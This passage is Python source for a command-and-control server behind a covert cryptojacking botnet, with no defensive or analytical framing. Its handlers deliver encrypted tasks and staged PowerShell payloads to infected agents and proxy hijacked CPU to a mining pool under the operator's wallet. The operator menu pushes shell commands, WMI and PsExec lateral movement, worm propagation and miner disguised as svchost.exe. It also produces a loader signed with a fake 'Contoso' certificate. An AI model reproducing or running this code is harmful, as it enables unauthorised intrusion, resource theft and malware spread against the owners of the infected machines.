            # We will send this via the 'intensity' message in the websocket.
            # No direct PS command for this. The agent just updates its internal config.
            log_event('task_sent', f"Agent {agent_id}: Scheduled miner process name change to '{new_name}' in DB.", agent_id=agent_id)
            # Send a dummy NO_TASK, as the actual process name change is handled by next miner.js deploy/intensity update
            encrypted_task = f.encrypt(b'NO_TASK')
        else:
            encrypted_task = f.encrypt(command_to_send.encode())
            log_event('task_sent', f"Task '{command_to_send}' sent to {agent_id}", agent_id=agent_id)
        
        return web.Response(text=base64.b64encode(encrypted_task).decode(), content_type=CONFIG["C2_PROFILE"]["TASK"]["content_type"])
    
    # If no pending task, send NO_TASK (encrypted)
    return web.Response(text=base64.b64encode(f.encrypt(b'NO_TASK')).decode(), content_type=CONFIG["C2_PROFILE"]["TASK"]["content_type"])

async def handle_staged_payload_delivery(request):
    """Handles delivery of the main agent payload in chunks."""
    agent_id = request.match_info['agent_id']
    chunk_id = int(request.match_info['chunk_id'])

    if agent_id not in agent_payload_cache:
        log_event('error', f"Agent {agent_id} requested staged payload but none found in cache.", agent_id=agent_id)
        return web.Response(status=404, text="Payload not found or expired")

    full_payload = agent_payload_cache[agent_id]
    chunk_size = CONFIG["PAYLOAD_CHUNK_SIZE"]

    start_index = chunk_id * chunk_size
    end_index = min(start_index + chunk_size, len(full_payload))

    if start_index >= len(full_payload):
        log_event('warning', f"Agent {agent_id} requested chunk {chunk_id} beyond payload length.", agent_id=agent_id)
        return web.Response(status=404, text="Chunk out of bounds")

    chunk_data = full_payload[start_index:end_index]
    total_chunks = (len(full_payload) + chunk_size - 1) // chunk_size # Ceiling division

    response = web.Response(body=base64.b64encode(chunk_data), content_type=CONFIG["C2_PROFILE"]["STAGED_PAYLOAD"]["content_type"])
    response.headers['X-Payload-Total-Chunks'] = str(total_chunks)
    log_event('payload_delivery', f"Delivering chunk {chunk_id}/{total_chunks-1} for agent {agent_id}", agent_id=agent_id)

    # If this is the last chunk, clear from cache to save memory
    if chunk_id >= total_chunks - 1:
        del agent_payload_cache[agent_id]
        log_event('payload_delivery', f"Last chunk delivered for agent {agent_id}. Payload removed from cache.", agent_id=agent_id)

    return response


async def handle_task_result(request):
    """Handles agent task result submission via POST request."""
    agent_id = request.match_info['agent_id']
    
    agent_doc = agents_collection.find_one({'agent_id': agent_id})
    if not agent_doc:
        log_event('error', f"Agent {agent_id} submitted result but is not registered.", agent_id=agent_id)
        return web.Response(status=404, text="Agent not found")
    
    f = Fernet(agent_doc['aes_key'].encode())
    
    encrypted_result_b64 = await request.text()
    try:
        encrypted_result = base64.b64decode(encrypted_result_b64)
        decrypted_result = f.decrypt(encrypted_result).decode()
    except Exception as e:
        log_event('error', f"Failed to decrypt task result from {agent_id}: {e}", agent_id=agent_id)
        log_crash(e, traceback.format_exc())
        return web.Response(status=400, text="Decryption failed")

    # Update the task status and log the result
    # Find the task that was "assigned" and now has a result
    task = tasks_collection.find_one_and_update(
        {'agent_id': agent_id, 'status': 'assigned'},
        {'$set': {'result': decrypted_result, 'status': 'completed', 'completion_time': datetime.now(UTC)}},
        sort=[('submission_time', -1)] # Get the most recently assigned task
    )
    
    if task:
        log_event('task_result', f"Task '{task['command']}' result from {agent_id}: {decrypted_result}", ip=request.remote, agent_id=agent_id)
        
        # Update miner status based on task command for reporting
        if task['command'].startswith("start_mining"):
            agents_collection.update_one({'agent_id': agent_id}, {'$set': {'miner_status': 'running'}})
        elif task['command'].startswith("stop_mining"):
            agents_collection.update_one({'agent_id': agent_id}, {'$set': {'miner_status': 'stopped'}})
        # If the task was to change process name, update the agent's stored current_process_name
        elif task['command'].startswith("change_miner_process_name|"):
            new_proc_name = task['command'].split('|')[1]
            agents_collection.update_one({'agent_id': agent_id}, {'$set': {'current_process_name': new_proc_name}})
            log_event('info', f"Agent {agent_id} process name updated to {new_proc_name} in DB.")
        # If the task was a DNS beacon, update its last beacon time
        elif task['command'].startswith("send_dns_beacon"):
            agents_collection.update_one({'agent_id': agent_id}, {'$set': {'last_dns_beacon': datetime.now(UTC)}})
    else:
        log_event('task_result', f"Result from {agent_id} received, but no matching assigned task found. Result: {decrypted_result}", ip=request.remote, agent_id=agent_id)
    
    return web.Response(text="Result received", content_type=CONFIG["C2_PROFILE"]["RESULTS"]["content_type"])

async def handle_telemetry(request):
    """Handles agent telemetry submission via POST request."""
    agent_id = request.match_info['agent_id']
    
    agent_doc = agents_collection.find_one({'agent_id': agent_id})
    if not agent_doc:
        log_event('error', f"Agent {agent_id} submitted telemetry but is not registered.", agent_id=agent_id)
        return web.Response(status=404, text="Agent not found")
    
    f = Fernet(agent_doc['aes_key'].encode())
    encrypted_telemetry = await request.text()
    
    try:
        decrypted_telemetry_str = f.decrypt(base64.b64decode(encrypted_telemetry)).decode()
        # Expected format from DualiousXVenom's agent: JSON string
        telemetry_data = json.loads(decrypted_telemetry_str)
        
        status = telemetry_data.get('miner_status', 'unknown')
        cpu = telemetry_data.get('cpu_usage', 0)
        mem = telemetry_data.get('memory_free', 100) # Percentage free memory
        hash_rate = telemetry_data.get('hash_rate', 0)
        security_events = telemetry_data.get('security_events', [])
        tz_offset = telemetry_data.get('timezone_offset', 0)
        agent_ip = telemetry_data.get('agent_ip', str(request.remote)) # Use self-reported IP, fallback to request.remote

        # Update agent's telemetry, last check-in time, and agent_ip
        agents_collection.update_one(
            {'agent_id': agent_id},
            {'$set': {
                'telemetry': {
                    'status': status,
                    'cpu': float(cpu),
                    'mem': float(mem),
                    'hash_rate': float(hash_rate),
                    'security_events': security_events,
                },
                'last_telemetry': datetime.now(UTC),
                'last_checkin': datetime.now(UTC), # Telemetry implies check-in
                'miner_status': status, # Update miner status directly from telemetry
                'timezone_offset': float(tz_offset), # Store timezone offset
                'ip_address': agent_ip # Store the self-reported IP
            }}
        )
        log_event('telemetry', f"Telemetry received from {agent_id}: CPU={cpu}%, Miner={status}, IP={agent_ip}", ip=request.remote, agent_id=agent_id)
    except Exception as e:
        log_event('error', f"Failed to decrypt/parse telemetry from {agent_id}: {e}", agent_id=agent_id)
        log_crash(e, traceback.format_exc())
        return web.Response(status=400, text="Telemetry processing failed")
    
    return web.Response(text="Telemetry received", content_type=CONFIG["C2_PROFILE"]["TELEMETRY"]["content_type"])

async def websocket_handler(request):
    """Handles WebSocket connections for miners. This acts as a proxy."""
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    
    agent_id = request.query.get('agent_id', 'unknown_miner')
    log_event('websocket', f"Miner WebSocket connected: {agent_id}", ip=request.remote, agent_id=agent_id)

    # Establish connection to the actual mining pool
    pool_ws = None
    try:
        # Connect to the actual mining pool
        # Using aiohttp.ClientSession context manager for proper session handling
        # Explicitly set ssl=False for the client websocket connect as the C2 is using self-signed certs
        # and the miner's websocket connection will be to the C2, not the pool directly.
        async with aiohttp.ClientSession() as session:
            pool_ws = await asyncio.wait_for(
                session.ws_connect(CONFIG["MINER_POOL_URL"], ssl=False), timeout=10 # Explicitly set ssl=False here for pool
            )
        log_event('websocket', f"Miner {agent_id} proxied to mining pool {CONFIG['MINER_POOL_URL']}", agent_id=agent_id)

        # Start two tasks: one to forward from agent to pool, one from pool to agent
        async def agent_to_pool():
            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    data = msg.json()
                    
                    # Update miner config (e.g., process name) if requested by C2 automation.
                    # This effectively sends a command to the miner through the intensity message.
                    agent_doc = agents_collection.find_one({'agent_id': agent_id.replace('worker_', '')}) # Remove 'worker_' prefix
                    if agent_doc:
                        # Fetch the latest intensity from the agent's assigned playbook
                        # Assuming 'playbook_id' field exists and links to a valid playbook document
                        playbook_doc = playbooks_collection.find_one({'playbook_id': agent_doc.get('playbook_id', 1)})
                        current_intensity = playbook_doc.get('intensity', CONFIG["DEFAULT_MINER_INTENSITY"]) if playbook_doc else CONFIG["DEFAULT_MINER_INTENSITY"]

                        current_proc_name = agent_doc.get('current_process_name', CONFIG["DEFAULT_MINER_PROCESS_NAME"])

                        # Send these as part of the 'intensity' message for the miner to pick up
                        # This combines intensity and process name update into one message type
                        response_to_miner = {
                            'type': 'intensity', 
                            'intensity': current_intensity,
                            'processName': current_proc_name # Include the process name for cloaking
                        }
                        await ws.send_json(response_to_miner)
                        log_event('websocket_config', f"Sent config (intensity: {current_intensity}, process: {current_proc_name}) to miner {agent_id}.", agent_id=agent_id)

                    if data.get('type') == 'login':
                        data['params'] = {
                            'login': CONFIG["MINER_WALLET_ADDRESS"],
                            'pass': 'x', # Standard XMRig pool password
                            'rigid': agent_id # Use agent_id as rigid for worker identification
                        }
                    await pool_ws.send_json(data)
                elif msg.type == aiohttp.WSMsgType.ERROR:
                    log_event('websocket_error', f"Agent-to-pool WS error with {agent_id}: {ws.exception()}", agent_id=agent_id)
                    break
            log_event('websocket', f"Agent-to-pool stream closed for {agent_id}.")

        async def pool_to_agent():
            async for msg in pool_ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    await ws.send_str(msg.data) # Forward directly
                elif msg.type == aiohttp.WSMsgType.ERROR:
                    log_event('websocket_error', f"Pool-to-agent WS error with {agent_id}: {pool_ws.exception()}", agent_id=agent_id)
                    break
            log_event('websocket', f"Pool-to-agent stream closed for {agent_id}.")
        
        # Run both forwarding tasks concurrently
        await asyncio.gather(agent_to_pool(), pool_to_agent())

    except asyncio.TimeoutError:
        log_event('websocket_error', f"Miner {agent_id} to pool connection timed out.", agent_id=agent_id)
    except Exception as e:
        log_event('websocket_error', f"Miner WebSocket proxy error for {agent_id}: {e}", agent_id=agent_id)
        log_crash(e, traceback.format_exc())
    finally:
        if pool_ws:
            await pool_ws.close()
        if ws:
            await ws.close()
        log_event('websocket', f"Miner WebSocket proxy connection fully closed for {agent_id}", agent_id=agent_id)
    
    return ws

async def health_check_endpoint(request):
    """Simple health check endpoint for the C2 server."""
    return web.Response(text="OK")

# --- CLI Menu Functions ---
# These functions define the interactive command-line interface for the operator.

def display_main_menu():
    """Displays the main CLI menu options for C2 operations."""
    print("\n--- C2 Operations Console ---")
    print("1. Agent & Task Management")
    print("   Manage registered agents and assign tasks.")
    print("2. View C2 Status")
    print("   Display overall C2 health and active sessions.")
    print("3. Assign Playbook to Agent")
    print("   Set automated strategy for a specific agent.")
    print("4. Recast Agents")
    print("   Push a new task/setting to multiple agents.")
    print("5. Generate Payloads")
    print("   Generate advanced payloads (e.g., signed wrappers).")
    print("6. Exit")
    print("   Shut down the C2 server.")
    print("----------------------------")

async def handle_agent_task_management_menu():
    """Handles the Agent & Task Management sub-menu interactions."""
    while True:
        print("\n--- Agent & Task Management ---")
        print("1. List Agents")
        print("   Show all registered agents.")
        print("2. Delete Agent")
        print("   Remove an agent from the database.")
        print("3. Assign Manual Task")
        print("   Send a custom command to a specific agent.")
        print("4. Get Task Results")
        print("   Retrieve latest results for a specific agent.")
        print("5. Back to Main Menu")
        print("-------------------------------")
        choice = input("Management> ").strip()

        try:
            if choice == '1':
                agents = agents_collection.find({})
                if agents_collection.count_documents({}) == 0:
                    print("No agents registered.")
                    continue
                print("\n--- Registered Agents ---")
                for agent in agents:
                    telemetry = agent.get('telemetry', {'cpu': 'N/A', 'mem': 'N/A', 'hash_rate': 'N/A'})
                    current_proc_name = agent.get('current_process_name', 'N/A')
                    print(f"ID: {agent['agent_id']} (IP: {agent['ip_address']}) | Status: {agent['status']} | Miner: {agent.get('miner_status', 'stopped')} | PB: {agent.get('playbook_id', 'None')}")
                    print(f"  CPU: {telemetry['cpu']}%, Mem: {telemetry['mem']}%, Hash: {telemetry['hash_rate']} H/s | Process: {current_proc_name}")
                    print(f"  Last Check-in: {agent['last_checkin'].strftime('%H:%M:%S UTC')}")
                    if agent.get('last_dns_beacon'):
                         print(f"  Last DNS Beacon: {agent['last_dns_beacon'].strftime('%H:%M:%S UTC')}")
                    # Display current beaconing parameters
                    print(f"  Beacon (Base/Jitter%): {agent.get('base_beacon_interval', 'N/A')}s / {agent.get('beacon_jitter_percent', 'N/A')*100:.0f}%")
                    if telemetry.get('security_events'):
                        print(f"  [!] Security Events: {len(telemetry['security_events'])} recent alerts.")
                    print("-" * 50)
                print("-------------------------")
            elif choice == '2':
                agent_id = input("Enter agent ID to delete: ").strip()
                result = agents_collection.delete_one({'agent_id': agent_id})
                print(f"Agent {agent_id} {'deleted' if result.deleted_count else 'not found'}.")
            elif choice == '3':
                agent_id = input("Enter agent ID to assign task: ").strip()
                if not agents_collection.find_one({'agent_id': agent_id}):
                    print(f"Agent {agent_id} not found.")
                    continue
                print("\nSupported manual commands:")
                print("  powershell_delivery           - Force agent to download and execute full PowerShell agent payload (staged).")
                print("  stealth_initial_setup         - Execute initial stealth setup tasks (recon, basic persistence).")
                print("  start_mining|<intensity>      - Instructs agent to start mining (e.g., 'start_mining|0.5').")
                print("  stop_mining                   - Instructs agent to stop mining.")
                print("  deploy_miner                  - Instructs agent to deploy miner.js (will be latest obfuscated version).")
                print("  report_telemetry              - Force agent to send immediate telemetry.")
                print("  cmd <shell_command>           - Executes a shell command (e.g., 'cmd whoami').")
                print("  wmi_exec|<target_ip>|<command> - Executes a command via WMI (e.g., 'wmi_exec|192.168.1.100|notepad.exe').")
                print("  psexec_exec|<target>|<user>|<pass>|<command> - Executes command via PsExec (e.g., 'psexec_exec|192.168.1.101|admin|pass|whoami').")
                print("  propagate_share|<source_path_on_agent>|<target_share_path> - Copies a payload to a network share (e.g., 'propagate_share|C:\\temp\\loader.exe|\\\\192.168.1.102\\C$\\temp\\loader.exe').")
                print("  start_worm_propagation        - Initiates worm-like propagation behavior.")
                print("  set_egress_config|<type>|<value> - Configures agent egress (e.g., 'set_egress_config|proxy|http://proxy.com:8080' or 'set_egress_config|user_agent|CustomAgent').")
                print("  change_miner_process_name|<name> - Instructs C2 to update agent's miner process name for next deploy (e.g., 'change_miner_process_name|svchost.exe').")
                print("  send_dns_beacon|<payload>     - Instructs agent to send a DNS TXT beacon with optional payload.")
                print("  set_beacon_params|<base_interval>|<jitter_percent> - Dynamically set agent beaconing (e.g., 'set_beacon_params|300|0.2').")
                command = input("Enter command: ").strip()
                
                if command.startswith("start_mining|"):
                    try:
                        intensity = float(command.split('|')[1])
                        if not (0 <= intensity <= 1.0): raise ValueError
                    except (ValueError, IndexError):
                        print("Invalid intensity. Must be 'start_mining|<0.0-1.0>'.")
                        continue
                elif command.startswith("set_beacon_params|"):
                    try:
                        parts = command.split('|')
                        if len(parts) == 3:
                            base = float(parts[1])
                            jitter = float(parts[2])
                            if base >= 1 and 0 <= jitter <= 1:
                                # Update agent's beacon params in DB directly
                                agents_collection.update_one(
                                    {'agent_id': agent_id},
                                    {'$set': {
                                        'base_beacon_interval': base,
                                        'beacon_jitter_percent': jitter
                                    }}
                                )
                                print(f"Beacon parameters for agent {agent_id} set to Base: {base}s, Jitter: {jitter*100:.0f}%.")
                                # No need to assign a task, agent will pick up next check-in
                                continue # Skip assigning a task for this specific command type
                            else:
                                print("Invalid beacon parameters. Base interval must be >=1, Jitter 0-1.")
                                continue
                        else:
                            print("Invalid set_beacon_params format. Expected 'set_beacon_params|<base>|<jitter>'")
                            continue
                    except (ValueError, IndexError):
                        print("Invalid beacon parameters. Must be 'set_beacon_params|<base>|<jitter>' (numbers).")
                        continue
                elif command not in ["powershell_delivery", "stealth_initial_setup", "stop_mining", "deploy_miner", "report_telemetry", "start_worm_propagation"] \
                        and not command.startswith("cmd ") \
                        and not command.startswith("wmi_exec|") \
                        and not command.startswith("psexec_exec|") \
                        and not command.startswith("propagate_share|") \
                        and not command.startswith("set_egress_config|") \
                        and not command.startswith("change_miner_process_name|") \
                        and not command.startswith("send_dns_beacon"):
                    print("Unsupported command. Please choose from the listed options or use 'cmd <shell_command>'.")
                    continue
                
                await assign_task_db(agent_id, command, priority=10) # Manual tasks are high priority
                print(f"Manual task '{command}' assigned to agent {agent_id}.")
            elif choice == '4':
                agent_id = input("Enter agent ID to get task results for: ").strip()
                tasks = tasks_collection.find(
                    {'agent_id': agent_id, 'status': 'completed'},
                    sort=[('completion_time', -1)]
                ).limit(5) # Show last 5 completed tasks
                
                if tasks_collection.count_documents({'agent_id': agent_id, 'status': 'completed'}) == 0:
                    print(f"No completed tasks for agent {agent_id}.")
                    continue

                print(f"\n--- Latest Task Results for Agent {agent_id} ---")
                for task in tasks:
                    print(f"  Command: {task['command']}")
                    print(f"  Result: {task.get('result', 'No result provided')[:500]}...") # Truncate long results for display
                    print(f"  Completed At: {task.get('completion_time').strftime('%Y-%m-%d %H:%M:%S UTC')}")
                    print("-" * 30)
                print("------------------------------------")
            elif choice == '5':
                break
            else:
                print("Invalid choice. Please try again.")
        except Exception as e:
            print(f"[CLI_ERROR] An error occurred in Agent & Task Management: {e}")
            log_crash(e, traceback.format_exc())

async def show_c2_status():
    """Displays the overall status of the C2 server."""
    try:
        print("\n--- C2 Server Status ---")
        print(f"Server Host: {Host}")
        print(f"Server Port: {Port}")
        print(f"Total Agents Registered: {agents_collection.count_documents({})}")
        print(f"Active Agents (last 10 min checkin): {agents_collection.count_documents({'last_checkin': {'$gte': datetime.now(UTC) - timedelta(minutes=10)}})}")
        print(f"Running Miners (reported): {agents_collection.count_documents({'miner_status': 'running'})}")
        print(f"Pending Tasks: {tasks_collection.count_documents({'status': 'pending'})}")
        print(f"Total Log Entries: {logs_collection.count_documents({})}")
        print(f"Active Playbooks: {playbooks_collection.count_documents({})}")
        print("------------------------")
    except Exception as e:
        print(f"[CLI_ERROR] An error occurred displaying C2 status: {e}")
        log_crash(e, traceback.format_exc())

async def assign_playbook_menu():
    """Menu to assign a playbook to a specific agent."""
    agent_id = input("Enter agent ID: ").strip()
    agent = agents_collection.find_one({'agent_id': agent_id})
    if not agent:
        print(f"Agent {agent_id} not found.")
        return
    
    print("\n--- Available Playbooks ---")
    playbooks = list(playbooks_collection.find({}).sort('playbook_id', pymongo.ASCENDING))
    if not playbooks:
        print("No playbooks defined. Please check server initialization.")
        return

    for pb in playbooks:
        # Display whether DNS beacon is enabled for this playbook
        dns_beacon_status = "Enabled" if pb.get('enable_dns_beacon', False) else "Disabled"
        print(f"{pb['playbook_id']}. {pb['name']} ({pb['type']}): {pb['description']} | DNS Beacon: {dns_beacon_status}")
        print(f"    Default Beacon (Base/Jitter%): {pb.get('base_beacon_interval', 'N/A')}s / {pb.get('beacon_jitter_percent', 'N/A')*100:.0f}%")
    
    try:
        pb_id = int(input("Enter playbook ID to assign (or 0 to cancel): ").strip())
        if pb_id == 0:
            print("Playbook assignment cancelled.")
            return

        selected_playbook = playbooks_collection.find_one({'playbook_id': pb_id})
        if selected_playbook:
            agents_collection.update_one({'agent_id': agent_id}, {'$set': {
                'playbook_id': pb_id,
                'base_beacon_interval': selected_playbook.get('base_beacon_interval', CONFIG['BASE_BEACON_INTERVAL']),
                'beacon_jitter_percent': selected_playbook.get('beacon_jitter_percent', CONFIG['BEACON_JITTER_PERCENT']),
            }})
            print(f"Playbook '{selected_playbook['name']}' assigned to agent {agent_id}.")
            log_event('playbook_assign', f"Playbook {selected_playbook['name']} assigned to agent {agent_id}", agent_id=agent_id)
        else:
            print("Invalid playbook ID.")
    except ValueError:
        print("Invalid input. Please enter a number.")
    except Exception as e:
        print(f"[CLI_ERROR] An error occurred during playbook assignment: {e}")
        log_crash(e, traceback.format_exc())

async def recast_agents_menu():
    """Menu to recast tasks/settings to multiple agents."""
    while True:
        print("\n--- Recast Agents ---")
        print("1. Push a general command to all active agents.")
        print("2. Push a general command to specific agents.")
        print("3. Back to Main Menu")
        print("---------------------")
        choice = input("Recast> ").strip()

        try:
            if choice == '1' or choice == '2':
                print("\nSupported recast commands:")
                print("  powershell_delivery           - Force all/selected agents to download and execute full PowerShell agent payload (staged).")
                print("  stealth_initial_setup         - Execute initial stealth setup tasks (recon, basic persistence).")
                print("  report_telemetry              - Force all/selected agents to send immediate telemetry.")
                print("  set_egress_config|<type>|<value> - Configures agent egress (e.g., 'set_egress_config|proxy|DIRECT').")
                print("  change_miner_process_name|<name> - Force agents to update miner process name (e.g., 'change_miner_process_name|svchost.exe').")
                print("  set_beacon_params|<base_interval>|<jitter_percent> - Dynamically set agent beaconing (e.g., 'set_beacon_params|300|0.2').")
                print("  cmd <shell_command>           - Executes a shell command (USE WITH CAUTION).")
                print("  wmi_exec|<target_ip>|<command> - Executes a command via WMI (e.g., 'wmi_exec|192.168.1.100|notepad.exe').")
                print("  psexec_exec|<target>|<user>|<pass>|<command> - Executes command via PsExec (e.g., 'psexec_exec|192.168.1.101|admin|pass|whoami').")
                print("  propagate_share|<source_path_on_agent>|<target_share_path> - Copies a payload to a network share (e.g., 'propagate_share|C:\\temp\\loader.exe|\\\\192.168.1.102\\C$\\temp\\loader.exe').")
                print("  start_worm_propagation        - Initiates worm-like propagation behavior.")
                command = input("Enter command to recast: ").strip()

                if not (command.startswith("powershell_delivery") or 
                        command.startswith("stealth_initial_setup") or 
                        command.startswith("report_telemetry") or 
                        command.startswith("set_egress_config|") or
                        command.startswith("change_miner_process_name|") or
                        command.startswith("set_beacon_params|") or
                        command.startswith("cmd ") or
                        command.startswith("wmi_exec|") or
                        command.startswith("psexec_exec|") or
                        command.startswith("propagate_share|") or
                        command.startswith("start_worm_propagation")):
                    print("Unsupported recast command. Please choose from the listed options.")
                    continue

                agent_ids = None
                if choice == '2': # Specific agents
                    agents_to_target = input("Enter comma-separated agent IDs (e.g., agent1,agent2): ").strip()
                    agent_ids = [aid.strip() for aid in agents_to_target.split(',') if aid.strip()]
                    if not agent_ids:
                        print("No agent IDs provided. Recast cancelled.")
                        continue
                    # Validate agent IDs
                    existing_agents = [a['agent_id'] for a in agents_collection.find({'agent_id': {'$in': agent_ids}})]
                    if len(existing_agents) != len(agent_ids):
                        missing = set(agent_ids) - set(existing_agents)
                        print(f"Warning: Some specified agents not found: {', '.join(missing)}. Proceeding with existing agents.")
                        agent_ids = existing_agents
                        if not agent_ids:
                            print("No valid agents to recast to. Recast cancelled.")
                            continue
                
                await recast_agents(command, agent_ids)
                print(f"Recast command '{command}' assigned to {'all active agents' if not agent_ids else ', '.join(agent_ids)}.")
            elif choice == '3':
                break
            else:
                print("Invalid choice. Please try again.")
        except Exception as e:
            print(f"[CLI_ERROR] An error occurred in Recast Agents menu: {e}")
            log_crash(e, traceback.format_exc())

async def recast_agents(command, agent_ids=None):
    """
    Pushes a given command to a list of specified agents, or all active agents if agent_ids is None.
    """
    query = {'status': 'active'}
    if agent_ids:
        query['agent_id'] = {'$in': agent_ids}
    
    agents_to_recast = agents_collection.find(query)
    count = 0
    for agent in agents_to_recast:
        # If the command is 'powershell_delivery', ensure the main payload is prepared.
        if command == "powershell_delivery":
            f = Fernet(agent['aes_key'].encode())
            current_miner_proc_name = agent.get('current_process_name', CONFIG["DEFAULT_MINER_PROCESS_NAME"])
            full_polymorphic_ps_script = generate_polymorphic_powershell(agent['agent_id'], agent['aes_key'], current_miner_proc_name)
            encrypted_full_payload = f.encrypt(full_polymorphic_ps_script.encode())
            agent_payload_cache[agent['agent_id']] = encrypted_full_payload # Cache for chunked delivery
            log_event('recast_engine', f"Prepared full payload for staged delivery to {agent['agent_id']}.", agent_id=agent['agent_id'])

        await assign_task_db(agent['agent_id'], command, priority=10) # High priority for recast tasks
        log_event('recast_engine', f"Recast task '{command}' assigned to agent {agent['agent_id']}.", agent_id=agent['agent_id'])
        count += 1
    log_event('recast_engine', f"Successfully assigned recast task to {count} agents.", agent_id="N/A")

async def generate_payloads_menu():
    """Menu to generate advanced payloads."""
    while True:
        print("\n--- Generate Payloads ---")
        print("1. Generate Staged PowerShell Loader (C# Source)")
        print("2. Back to Main Menu")
        print("-------------------------")
        choice = input("Payloads> ").strip()

        try:
            if choice == '1':
                print("\nGenerating C# PowerShell launcher source code for staged loader...")
                
                dummy_agent_id = "GEN_PAYLOAD"
                dummy_aes_key = Fernet.generate_key().decode()
                
                # Generate the small staged loader script
                staged_loader_script = generate_staged_powershell_loader(dummy_agent_id, dummy_aes_key)
                staged_loader_script_b64 = base64.b64encode(staged_loader_script.encode('utf-8')).decode('utf-8')

                output_file = f"StagedLauncher_{int(time.time())}.cs"
                generated_path = generate_csharp_powershell_wrapper_source(staged_loader_script_b64, output_file)
                
                if generated_path:
                    print(f"\nC# source code saved to: {generated_path}")
                    print("\nTo compile and sign this executable (requires .NET SDK and Windows SDK with SignTool):")
                    print(f"1. Compile: csc.exe /out:{os.path.join(LAUNCHER_SOURCE_DIR, output_file.replace('.cs', '.exe'))} {generated_path}")
                    print("2. Generate Self-Signed Certificate (if you don't have one):")
                    print("   makecert -r -pe -n \"CN=Contoso Software, O=Contoso Corporation, C=US\" -ss My -sr CurrentUser -sky signature -sv MyContosoCert.pvk MyContosoCert.cer")
                    print("   pvk2pfx -pvk MyContosoCert.pvk -spc MyContosoCert.cer -pfz MyContosoCert.pfx")
                    print("3. Sign the executable:")
                    print(f"   signtool.exe sign /f MyContosoCert.pfx /t http://timestamp.digicert.com /fd SHA256 /v {os.path.join(LAUNCHER_SOURCE_DIR, output_file.replace('.cs', '.exe'))}")
                    print("\nRemember to distribute MyContosoCert.cer to the target system if pinning is desired or for trusted execution scenarios.")
                else:
                    print("Failed to generate C# PowerShell wrapper source.")
            elif choice == '2':
                break
            else:
                print("Invalid choice. Please try again.")
        except Exception as e:
            print(f"[CLI_ERROR] An error occurred in Payload Generation menu: {e}")
            log_crash(e, traceback.format_exc())

# --- CLI Loop Management (Separates Blocking Input from Async Loop) ---

# This helper function is run in the main thread's event loop to signal shutdown
async def _shutdown_signal(event: asyncio.Event):
    """Sets the event to signal graceful shutdown of the main server loop."""
    event.set()

def cli_loop_sync(loop: asyncio.AbstractEventLoop, shutdown_event: asyncio.Event):
    """Synchronous CLI loop for user interaction.
    It runs in a separate thread and uses run_coroutine_threadsafe to interact with the main async loop."""
    while True:
        display_main_menu()
        choice = input("Enter your choice: ").strip()

        try:
            if choice == '1':
                # Submit async task to main loop and wait for result
                asyncio.run_coroutine_threadsafe(handle_agent_task_management_menu(), loop).result()
            elif choice == '2':
                asyncio.run_coroutine_threadsafe(show_c2_status(), loop).result()
            elif choice == '3':
                asyncio.run_coroutine_threadsafe(assign_playbook_menu(), loop).result()
            elif choice == '4':
                asyncio.run_coroutine_threadsafe(recast_agents_menu(), loop).result()
            elif choice == '5':
                asyncio.run_coroutine_threadsafe(generate_payloads_menu(), loop).result()
            elif choice == '6':
                log_event('shutdown', "Shutting down server...")
                # Schedule the shutdown signal on the main loop
                asyncio.run_coroutine_threadsafe(_shutdown_signal(shutdown_event), loop)
                # Give a moment for shutdown to initiate
                time.sleep(1)
                os._exit(0) # Force exit after graceful shutdown attempts
            else:
                print("Invalid choice. Please enter a number from the menu.")
        except Exception as e:
            print(f"[CLI_ERROR] An error occurred in the main CLI loop: {e}")
            log_crash(e, traceback.format_exc())
        finally:
            time.sleep(0.1) # Small sleep to prevent busy-waiting

def start_cli_thread(loop: asyncio.AbstractEventLoop, shutdown_event: asyncio.Event):
    """Starts the CLI loop in a separate daemon thread."""
    # The CLI thread calls a synchronous function, which then interacts with the main async loop.
    cli_loop_sync(loop, shutdown_event)

# --- Playbooks (Pre-defined strategies) ---
def initialize_playbooks():
    """Initializes predefined playbooks in MongoDB if they don't exist."""
    playbooks = [
        # Mining Strategies (type: 'mining')
        {'playbook_id': 1, 'name': 'Stealth Mining', 'type': 'mining', 'intensity': 0.15, 'auto_redeploy': True, 'description': 'Low CPU, strictly off-hours mining. Maximize stealth.', 'active_hours_start': 18, 'active_hours_end': 8, 'enable_dns_beacon': False, 'base_beacon_interval': 120, 'beacon_jitter_percent': 0.4}, # Default beacon 2m +/-40%
        {'playbook_id': 2, 'name': 'Aggressive Mining', 'type': 'mining', 'intensity': 0.6, 'auto_redeploy': True, 'description': 'High CPU usage during detected idle periods. Maximize profit.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': False, 'base_beacon_interval': 30, 'beacon_jitter_percent': 0.1}, # Fast beacon 30s +/-10%
        {'playbook_id': 3, 'name': 'Balanced Mining', 'type': 'mining', 'intensity': 0.3, 'auto_redeploy': True, 'description': 'Moderate CPU, balances profit and stealth.', 'active_hours_start': 18, 'active_hours_end': 8, 'enable_dns_beacon': False, 'base_beacon_interval': 60, 'beacon_jitter_percent': 0.25}, # Balanced beacon 1m +/-25%
        {'playbook_id': 4, 'name': 'Idle Time Miner', 'type': 'mining', 'intensity': 0.4, 'auto_redeploy': True, 'description': 'Only mines when system CPU is below 10% for > 5 min. (requires agent-side idle detection).', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': False, 'base_beacon_interval': 180, 'beacon_jitter_percent': 0.3},
        {'playbook_id': 5, 'name': 'Weekend Warrior', 'type': 'mining', 'intensity': 0.5, 'auto_redeploy': True, 'description': 'Aggressive mining only on weekends (requires C2 day-of-week check in schedule_tasks).', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': False, 'base_beacon_interval': 90, 'beacon_jitter_percent': 0.15},
        {'playbook_id': 6, 'name': 'Night Owl Miner', 'type': 'mining', 'intensity': 0.4, 'auto_redeploy': True, 'description': 'Strictly active from 10 PM to 6 AM local time.', 'active_hours_start': 22, 'active_hours_end': 6, 'enable_dns_beacon': False, 'base_beacon_interval': 150, 'beacon_jitter_percent': 0.35},

        # Defensive/Persistence Strategies (type: 'defensive')
        {'playbook_id': 7, 'name': 'Defensive Persistence', 'type': 'defensive', 'intensity': 0.05, 'auto_redeploy': True, 'description': 'Focus on persistence and evasion. Minimal or no mining.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': True, 'base_beacon_interval': 3600, 'beacon_jitter_percent': 0.5}, # DNS beacon enabled here, slow beacon 1h +/-50%
